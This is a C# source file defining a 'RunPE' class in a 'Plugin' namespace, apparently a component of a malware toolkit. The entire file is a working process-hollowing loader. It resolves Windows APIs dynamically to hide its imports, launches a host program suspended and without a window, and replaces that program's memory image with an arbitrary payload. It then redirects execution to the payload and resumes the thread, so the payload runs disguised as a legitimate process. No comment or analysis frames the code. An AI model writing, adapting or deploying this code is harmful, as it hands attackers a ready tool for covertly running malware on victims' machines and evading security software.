using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;

namespace Plugin
{
    public static class RunPE
    {

        #region API delegate
        private delegate int DelegateResumeThread(IntPtr handle);
        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);
        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);
        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        #endregion


        #region API
        private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");
        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");
        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");
        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");
        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");
        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");
        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");
        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");
        #endregion


        #region CreateAPI
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        private static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }
        #endregion


        #region Structure
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        #endregion


        public static void Run(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0x0;
                StartupInformation si = new StartupInformation();
                ProcessInformation pi = new ProcessInformation();
                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                try
                {
                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
                    int[] context = new int[0xB3];
                    context[0x0] = 0x10002;
                    if (IntPtr.Size == 0x4)
                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    else
                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    int ebx = context[0x29];
                    int baseAddress = 0x0;
                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite)) throw new Exception();
                    if (imageBase == baseAddress)
                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0) throw new Exception();
                    int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);
                    bool allowOverride = false;
                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);

                    if (newImageBase == 0x0) throw new Exception();
                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();
                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);
                        if (sizeOfRawData != 0x0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0x0, sectionData.Length);
                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                        }
                        sectionOffset += 0x28;
                    }
                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite)) throw new Exception();
                    int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
                    if (allowOverride) newImageBase = imageBase;
                    context[0x2C] = newImageBase + addressOfEntryPoint;

                    if (IntPtr.Size == 0x4)
                    {
                        if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                    }
                    else
                    {
                        if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                    }
                    if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
                }
                catch
                {
                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                    continue;
                }
                break;
            }
        }
    }

}
